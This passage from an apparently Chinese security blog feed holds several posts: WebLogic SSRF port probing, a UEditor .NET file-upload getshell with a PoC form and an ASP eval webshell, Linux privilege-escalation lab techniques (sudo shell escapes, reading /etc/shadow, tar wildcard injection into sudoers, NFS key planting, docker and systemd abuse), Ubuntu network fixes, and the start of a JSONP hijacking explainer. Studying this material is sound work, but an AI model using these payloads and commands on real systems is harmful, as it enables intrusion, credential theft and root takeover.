    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>测试遇到了BEA Weblogic Server ssrf漏洞，记录一下。</p><h2 id="0x01-ssrf内网端口探测"><a href="#0x01-ssrf内网端口探测" class="headerlink" title="0x01 ssrf内网端口探测"></a>0x01 ssrf内网端口探测</h2><p>探测内网主机 10.10.0.217 2222端口</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>zhengbao.wang<span class="regexp">/uddiexplorer/</span>SearchPublicRegistries.jsp?operator=http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">0.217</span>:<span class="number">2222</span>&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure><p>端口开放回显<code>did not have a valid SOAP content-type</code>,如下图</p><p><img src="https://i.loli.net/2019/09/26/NG3tCKqskW4uwDo.png" alt></p><p>探测1234端口，端口关闭回显<code>could not connect over HTTP to server</code>,如下图</p><p><img src="https://i.loli.net/2019/09/26/JZlQ3zy6qPdGU4H.png" alt></p><p>根据回显不同，可做内网端口探测。</p><p>其他关于ssrf的利用，可参见博客文章 <a href="https://zhengbao.wang/SSRF%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF">SSRF的一些利用姿势</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;测试遇到了BEA Weblogic Server ssrf漏洞，记录一下。&lt;/p&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ssrf" scheme="https://zhengbao.wang/tags/ssrf/"/>
    
      <category term="weblogic" scheme="https://zhengbao.wang/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>UEditor .net版本任意文件上传</title>
    <link href="https://zhengbao.wang/UEditor-net%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://zhengbao.wang/UEditor-net版本任意文件上传/</id>
    <published>2019-09-25T12:44:59.000Z</published>
    <updated>2019-09-25T12:49:27.784Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天在渗透过程中碰到了一个UEditor .net版本，刚好最近想更新下博客，记录一个getshell的过程。</p><h2 id="0x01-UEditor-net版本任意文件上传"><a href="#0x01-UEditor-net版本任意文件上传" class="headerlink" title="0x01 UEditor .net版本任意文件上传"></a>0x01 UEditor .net版本任意文件上传</h2><p>这个任意文件上传是18年8月份爆出来的，漏洞的成因是在获取图片资源时仅检查了ContentType，导致可以绕过达到任意文件上传。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (response.ContentType.IndexOf(<span class="string">"image"</span>) == -<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                State = <span class="string">"Url is not an image"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>漏洞利用poc</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://xx/ueditor/net/controller.ashx?action=catchimage"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"source[]"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在服务中构造绕过验证的一句话<code>submit</code>即可</p><p><img src="https://i.loli.net/2019/09/25/rjEqK5SJPvm19Gp.png" alt></p><p>因为这里只验证了contentType,所以可以在代码中伪造contentType,我所使用的为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: image/jpeg'</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;% eval request(\"cmd\") %&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我这里使用的是php文件，利用的时候可以采用<code>poc.php?.asp</code>的形式，这样上传后的文件就为asp文件了。</p><p>提交之后便会返回webshell路径</p><p><img src="https://i.loli.net/2019/09/25/LIQaEP3DTiJ9WO4.png" alt></p><h2 id="0x02-参考资料"><a href="#0x02-参考资料" class="headerlink" title="0x02 参考资料"></a>0x02 参考资料</h2><p><a href="https://www.jianshu.com/p/6dae608b617c?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">UEditor .net版本 getshell</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;今天在渗透过程中碰到了一个UEditor .net版本，刚好最近想更新下博客，记录一个getshel
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传" scheme="https://zhengbao.wang/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权姿势</title>
    <link href="https://zhengbao.wang/Linux%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF/"/>
    <id>https://zhengbao.wang/Linux提权姿势/</id>
    <published>2019-09-24T08:48:27.000Z</published>
    <updated>2019-09-24T08:49:56.483Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文是在阅读了<code>in.security 提权靶场通关手册</code>后学习的一点总结和记录，作为笔记供以后使用查阅。原文链接将附在文末。</p><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>获取到一个shell后，要进行一系列的信息收集，以获取更多的提权思路。</p><ul><li><p>检测当前用户权限</p><p><code>whoami</code>  <code>id</code></p><p><img src="https://i.loli.net/2019/09/23/Ju21c6HLqaCrER7.png" alt></p></li><li><p>查看系统的发行版本和内核版本</p><p><code>lsb_release -a</code>  <code>uname -a</code></p><p><img src="https://i.loli.net/2019/09/23/9pc5RzrtWehmGQ2.png" alt></p></li><li><p>查看suid文件</p></li></ul><p><img src="https://i.loli.net/2019/09/23/5eydfPx4hBpRacN.png" alt></p><ul><li>查看运行的服务及安装的程序</li><li>查看<code>/etc/passwd</code>文件及隐藏文件等</li></ul><p>收集到的信息越多，越能找到更多的突破口。</p><h2 id="0x02-提权方法"><a href="#0x02-提权方法" class="headerlink" title="0x02 提权方法"></a>0x02 提权方法</h2><h3 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo  提权"></a>sudo  提权</h3><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具。普通用户可以通过<code>sudo -l</code>命令查看可以执行哪些命令。这样普通用户就可以在不知道root密码的情况下使用这些命令。因为用户使用<code>sudo</code>命令时需验证自己身份，因此这个方法需要知道普通用户的密码。</p><p><img src="https://i.loli.net/2019/09/23/ejFrkhbDVAzfXwE.png" alt></p><p>可以看到靶场<code>bob</code>用户可以使用<code>awk</code> <code>curl</code> <code>man</code> 等很多命令。</p><p>那么下面就这些命令展开利用，这里推荐一个在线查询工具：<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p><p><code>sudo awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</code> 这里借助<code>awk</code>直接获取到root权限</p><p><img src="https://i.loli.net/2019/09/23/yikXDCVNZ892mrB.png" alt></p><p>接下来用<code>man</code>试一下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/23/mAOjVwKYQPMn4tl.png" alt></p><p>利用<code>script</code></p><p><code>script -q /dev/null</code></p><p><img src="https://i.loli.net/2019/09/23/lWf3ycnVjSuOkKm.png" alt></p><p>利用<code>curl</code>读取root文件</p><p><code>curl file:///etc/shadow</code></p><p>其他的都可以通过上面的在线网站查找到利用方式，这里不一一例举了。</p><h3 id="cronjobs-提权"><a href="#cronjobs-提权" class="headerlink" title="cronjobs 提权"></a>cronjobs 提权</h3><p>如果系统管理员设置了计划任务并以root权限运行，比如周期性的运行某一个脚本，如果普通有权限修改这个脚本的话，便可以执行任意命令造成权限提升。</p><p>此外还有一个Crontab Tar通配符注入，当计划任务中以root权限进行tar命令操作时，可以造成通配符注入进行权限提升。下面在靶场中进行展示。</p><p>查看<code>/etc/crontab</code>，可以看到每分钟执行了<code>backup</code>脚本</p><p><img src="https://i.loli.net/2019/09/23/13DjNI6qBE2PyFb.png" alt></p><p>查看backup内容，进行了tar打包操作，</p><p><img src="https://i.loli.net/2019/09/23/ZCaqENBFmHAGyzr.png" alt></p><p>然后便可以进行提权操作了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'echo "ignite ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers'</span> &gt;test.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span> &gt; <span class="string">"--checkpoint-action=exec=sh test.sh"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span> &gt; --checkpoint=1</span><br></pre></td></tr></table></figure><p>等一分钟后，待计划任务完成，使用<code>sudo  bash</code>，便会提升至root权限。</p><p><img src="https://i.loli.net/2019/09/23/DpSmHZxsV51AUIG.png" alt></p><p>那么在第一步说到的信息收集中，查看<code>/etc/crontab</code>也应该被列为信息收集的一步，说不定就会有意想不到的收获。</p><p>所以在设定计划任务时要注意一些问题：</p><ul><li>crontab任务千万不要写到/etc/crontab文件里。通过crontab -e去创建，让他写到默认的/var/spool/cron下；</li><li>尽量避免使用root 去创建，如果一定要用root，要注意设置权限。</li></ul><h3 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h3><p>suid是指二进制文件在执行时拥有其拥有者owner的权限，例如<code>passwd</code>命令</p><p><img src="https://i.loli.net/2019/09/23/6wWuqF3zdls4ijG.png" alt></p><p>使用<code>find / -user root -perm -4000 2&gt;/dev/null</code> 或者<code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;</code>查找所有owner为root且为suid的二进制文件</p><p><img src="https://i.loli.net/2019/09/23/WKQaFylPcST3oNs.png" alt></p><p>查看其中一个<code>/usr/bin/taskset</code>,在前面提到的在线网站<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a>查看命令</p><p><code>sudo taskset 1 /bin/sh</code>直接获取到root权限</p><p><img src="https://i.loli.net/2019/09/23/IjMiak5X6hRlxJA.png" alt></p><h3 id="NFS-未授权"><a href="#NFS-未授权" class="headerlink" title="NFS 未授权"></a>NFS 未授权</h3><p>nmap扫描一下<code>nmap -T4 -sS -Pn 192.168.111.122</code></p><p>发现了2049端口开启的nfs服务，nfs，英文全称Network File System，即网络文件系统，是由SUN公司研制的UNIX表示层协议，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。</p><p><img src="https://i.loli.net/2019/09/24/Jct4FXgTAv9bxG3.png" alt></p><p>这里使用两外一台机器对其进行访问。 </p><p>首先<code>showmount -e 192.168.111.122</code>查看可以访问的目录。</p><p><img src="https://i.loli.net/2019/09/24/Siw4pRZtyB9W28c.png" alt></p><p>将其挂载到本地进行查看</p><p><img src="https://i.loli.net/2019/09/24/XS5Z7jE6kvA4imN.png" alt></p><p>我们在挂载的<code>/mnt/peter</code>目录是没有写权限的，但是由于其所有者uid设定1001，所属组gid设定1005，所有只需要本地创建一个uid为1001，gid为1005的用户即可绕过其权限验证。</p><p><img src="https://i.loli.net/2019/09/24/ORBzYbu2tKAg7dn.png" alt></p><p>创建一个符合要求的用户后，即可执行写操作了。</p><p><img src="https://i.loli.net/2019/09/24/orpnVlsiH2JCeuN.png" alt></p><p>生成新创建用户boogle的ssh公钥对和私钥对。</p><p><img src="https://i.loli.net/2019/09/24/eqhYgBTGLuJZVaH.png" alt></p><p>因为现在又对peter家目录的写权限，所以现在可以直接将上面的公钥对写入到peter的<code>.ssh</code>目录下，这样便可以直接使用ssh登陆获取peter用户的shell。</p><p><img src="https://i.loli.net/2019/09/24/UNlsf8JdogWDOYh.png" alt></p><h3 id="docker-组用户提权"><a href="#docker-组用户提权" class="headerlink" title="docker 组用户提权"></a>docker 组用户提权</h3><p>查看上面peter发现其属于<code>docker</code>组用户</p><p><img src="https://i.loli.net/2019/09/24/7b4pQBkcJw2EWxr.png" alt></p><p>docker组用户的权限还是非常大的，相当于root权限了。可以借助其提权到root权限。</p><p>思路参考：<a href="https://www.freebuf.com/articles/system/170783.html" target="_blank" rel="noopener">普通用户借助Docker容器提权思路分享</a>。</p><p>还有一个具体的利用代码：<a href="https://github.com/chrisfosterelli/dockerrootplease" target="_blank" rel="noopener">https://github.com/chrisfosterelli/dockerrootplease</a></p><p><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code></p><h3 id="systemd-配置提权"><a href="#systemd-配置提权" class="headerlink" title="systemd 配置提权"></a>systemd 配置提权</h3><p>查看<code></code>文件，并且peter用户有对其读写的权限。</p><p><img src="https://i.loli.net/2019/09/24/RYWZGhbSQkTmBzL.png" alt></p><p>修改其配置ExecStart指向我们自定义的二进制文件，其启动时便会以root用户执行这个文件。</p><p><img src="https://i.loli.net/2019/09/24/VEmf9MutGBon7aL.png" alt></p><p>创建一个systemdexpl.sh脚本，将/bin/bash文件复制到systemdbash并设置一个SUID位并且赋予执行权限</p><p><code>echo -e &#39;#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash&#39; &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh</code></p><p><img src="https://i.loli.net/2019/09/24/sAR4UaNp6L9DbJo.png" alt></p><p>重启之前便会生成systemdbash文件</p><p><img src="https://i.loli.net/2019/09/24/MhyCcbHdWVPRZ5l.png" alt></p><p>复制前面的ssh公钥到root用户下</p><p><img src="https://i.loli.net/2019/09/24/1vYNf3jI6l2cFnV.png" alt></p><p>然后便可以直接ssh登陆到root</p><p><img src="https://i.loli.net/2019/09/24/SwOntaiyFLhDGcW.png" alt></p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489960&amp;idx=1&amp;sn=ae35c8e5eb5e08e713cfd204b71a6b9d&amp;chksm=fc1e8e7ecb6907685255c77713c7a99b4acdc223db736f1610202b84ac8467335b6b076286b9&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1568377810435&amp;sharer_shareid=1a40c63f9740ea43a4986b88206018cd#rd" target="_blank" rel="noopener">in.security 提权靶场通关手册上篇</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247490025&amp;idx=1&amp;sn=f6ba22761d89c1154c4bc9bd22e16df0&amp;chksm=fc1e8e3fcb690729907504393dd6c788c05c9cd9866e3df62786bbc318ab7524ea5c716e7501&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1568338917816&amp;sharer_shareid=1a40c63f9740ea43a4986b88206018cd#rd" target="_blank" rel="noopener">in.security 提权靶场通关手册下篇</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;本文是在阅读了&lt;code&gt;in.security 提权靶场通关手册&lt;/code&gt;后学习的一点总结和记
      
    
    </summary>
    
      <category term="后渗透" scheme="https://zhengbao.wang/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="提权" scheme="https://zhengbao.wang/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu网络问题记录</title>
    <link href="https://zhengbao.wang/ubuntu%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://zhengbao.wang/ubuntu网络问题记录/</id>
    <published>2019-09-21T09:05:00.000Z</published>
    <updated>2019-09-24T09:06:55.244Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>又遇到了ubuntu18.04的网络问题，这里记录一下，他日备用。</p><h2 id="0x01-问题排查"><a href="#0x01-问题排查" class="headerlink" title="0x01 问题排查"></a>0x01 问题排查</h2><h3 id="检查物理机服务"><a href="#检查物理机服务" class="headerlink" title="检查物理机服务"></a>检查物理机服务</h3><p>如果是虚拟机，首先在物理机中查看服务，查看下面内容是否已经启动，没有则启动。</p><p><img src="https://i.loli.net/2019/09/12/UFsVyiwIOD18bdu.png" alt></p><h3 id="检查interfaces配置"><a href="#检查interfaces配置" class="headerlink" title="检查interfaces配置"></a>检查interfaces配置</h3><p>虚拟机配置为NAT模式，小图标显示网卡启动成功，但是使用<code>ifconfig</code>却看不到网卡信息。</p><p><img src="https://i.loli.net/2019/09/12/a6CU8iHybXqOrMd.png" alt></p><p>执行命令<code>if a</code>，这里<code>ens33</code>网卡在<code>ifconfig</code>中并没有显示出来。（下图是配置好后截图）</p><p><img src="https://i.loli.net/2019/09/12/d4azA6UKw2OI9rq.png" alt></p><p>然后编辑interfaces文件    <code>sudo vi /etc/network/interfaces</code></p><p>这里并没有<code>ens33</code>配置信息，添加一下。</p><p><img src="https://i.loli.net/2019/09/12/ircL7zwNVC1v6OU.png" alt></p><p>添加内容</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto ens33</span><br><span class="line">iface<span class="built_in"> INTERFACE </span>inet dhcp</span><br></pre></td></tr></table></figure><p>保存配置后重启网络<code>/etc/init.d/networking restart</code></p><p>网络通畅。</p><h3 id="检查netplan配置"><a href="#检查netplan配置" class="headerlink" title="检查netplan配置"></a>检查netplan配置</h3><p>ubuntu18.04 LTS后使用<code>netplan</code>配置网络，此时当查看<code>interfaces</code>文件时会发现下面的提示。</p><p><img src="https://i.loli.net/2019/09/24/kbe3tVQKPpzEgqh.png" alt></p><p>这时要修改<code>/etc/netplan/50-cloud-init.yaml</code>文件</p><p><img src="https://i.loli.net/2019/09/24/FVdrESneNZzcBwY.png" alt></p><p><code>sudo netplan apply</code>使配置生效。</p><h3 id="防火墙问题"><a href="#防火墙问题" class="headerlink" title="防火墙问题"></a>防火墙问题</h3><p>此外还可能存在防火墙配置问题，比如<code>ufw</code> </p><p><code>sudo ufw disable</code></p><h2 id="0x02-其他问题"><a href="#0x02-其他问题" class="headerlink" title="0x02 其他问题"></a>0x02 其他问题</h2><p>如果后期遇到其他问题，将继续作补充。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;又遇到了ubuntu18.04的网络问题，这里记录一下，他日备用。&lt;/p&gt;
&lt;h2 id=&quot;0x01
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="linux" scheme="https://zhengbao.wang/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>jsonp劫持漏洞</title>
    <link href="https://zhengbao.wang/jsonp%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/"/>
    <id>https://zhengbao.wang/jsonp劫持漏洞/</id>
    <published>2019-08-16T08:28:38.000Z</published>
    <updated>2019-08-16T08:30:47.360Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>jsonp在跨域资源共享方面已存在了好多年，jsonp劫持技术也已被大佬们用烂了，本篇文章从介绍什么是jsonp开始，由浅入深介绍jsonp劫持漏洞产生的前因后果。重新拾一拾这个被遗忘在角落的漏洞。</p><h2 id="0x01-何为jsonp"><a href="#0x01-何为jsonp" class="headerlink" title="0x01 何为jsonp"></a>0x01 何为jsonp</h2><p>所谓jsonp，其实是聪明的程序们为了克服同源策略实现跨域资源共享的一种方式,一经出现便得到广泛应用，逐渐成为一种非官方跨域数据交换协议。而它与json又有什么关系呢？准确来说关系不大，只不过json作为一种轻量级的数据交换格式，能够被多种语言直接使用，因此jsonp这种数据共享方式也使用了json格式来共享数据，即JSON with Padding。既然json只是一种数据交换格式，那么使用jsonp这种方式共享其他数据格式也是可以的，比如说直接用字符串。</p><h2 id="0x02-为什么要使用jsonp"><a href="#0x02-为什么要使用jsonp" class="headerlink" title="0x02 为什么要使用jsonp"></a>0x02 为什么要使用jsonp</h2><p>既然json就能够直接被多种语言直接使用，为啥在进行数据交换时还得padding一下，变为jsonp呢？其实在上面就已经提到过了，jsonp并不是简单的为了数据交换，而是实现跨域资源共享。我们知道，因为同源策略的存在，致使资源不能跨域访问，这时如果想跨域进行资源访问，就可以使用jsonp这种方式了。</p><p>下面我们搭建一个简单的环境理解一下，<code>json.json</code>文件中保存要共享的资源，<code>get_json.html</code>用于获取资源</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//json.json</span><br><span class="line">&#123; username: "boogle", password: "zhengbao.wang" &#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//get_json.html</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://libs.baidu.com/jquery/2.0.0/jquery.min.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> &gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"> $.ajax(&#123;</span></span><br><span class="line"><span class="actionscript"> url: <span class="string">'http://192.168.111.132/json.json'</span>,</span></span><br><span class="line"><span class="actionscript"> type:<span class="string">"get"</span>,     </span></span><br><span class="line"><span class="actionscript"> dataType: <span class="string">"json"</span>,</span></span><br><span class="line"><span class="actionscript"> success: <span class="function"><span class="keyword">function</span> <span class="params">(data)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(data);&#125;</span></span><br><span class="line"><span class="undefined"> &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在同源环境进行数据获取时，一切正常。</p><p><img src="https://i.loli.net/2019/08/15/ziJdNZRkt8h7y35.png" alt></p><p>将<code>get_json.html</code>放在与<code>json.json</code>不同源的地方访问时，会出现报错</p><p><img src="https://i.loli.net/2019/08/15/fONGHXuUpWDY1Rw.png" alt></p><p>那为啥jsonp为啥能进行跨域资源访问呢？如果你足够仔细，便会发现在上面<code>get_json.html</code>代码的第一行，<code>&lt;script&gt;</code>标签中是引用了百度的<code>jquery</code>,但是这个<code>http://libs.baidu.com</code>与我们的数据完完全全是不同源的呀，为啥可以这样引用呢，这是因为<code>&lt;script&gt;</code>标签并不遵循同源策略，可以直接进行跨域资源访问。而聪明的程序员们也正是利用了这一点，实现了<code>jsonp</code>.</p><h2 id="0x03-如何使用jsonp"><a href="#0x03-如何使用jsonp" class="headerlink" title="0x03 如何使用jsonp"></a>0x03 如何使用jsonp</h2><p>既然<code>&lt;script&gt;</code>标签可以跨域，那么便可以直接构造一个<code>&lt;script&gt;</code>标签进行跨域资源访问了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//get_jsonp.html</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://libs.baidu.com/jquery/2.0.0/jquery.min.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"> <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript"> s.src = <span class="string">'http://192.168.111.132/json.json'</span>;</span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.body.appendChild(s);</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问之后却报错了。此时虽然报错，但是仔细观察一下，这时其实已经访问到跨域的<code>json.json</code>文件了，只不过该文件中的内容并不符合<code>javascript</code>代码规范，导致了报错。</p><p><img src="https://i.loli.net/2019/08/15/CFxWmznMUVyJOpu.png" alt></p><p>此时只需将<code>json.json</code>中的内容按照代码规范去规定，便可以实现跨域资源访问。聪明的程序员们很快便找到了解决问题的办法。只需让目标页面回调本地页面的方法，并带入参数即可，这也就是<code>jsonp</code>的核心原理。</p><p>重新写一下<code>get_jsonp.html</code>和定义<code>json.json</code>的文件内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//get_jsonp.html</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://libs.baidu.com/jquery/2.0.0/jquery.min.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">callback</span><span class="params">(json)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(json);</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"> <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript"> s.src = <span class="string">'http://192.168.111.132/json.json'</span>;</span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.body.appendChild(s);</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在json.json中按照<code>javascript</code>代码规范调用<code>callback</code>函数，并将数据作为参数传入</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span 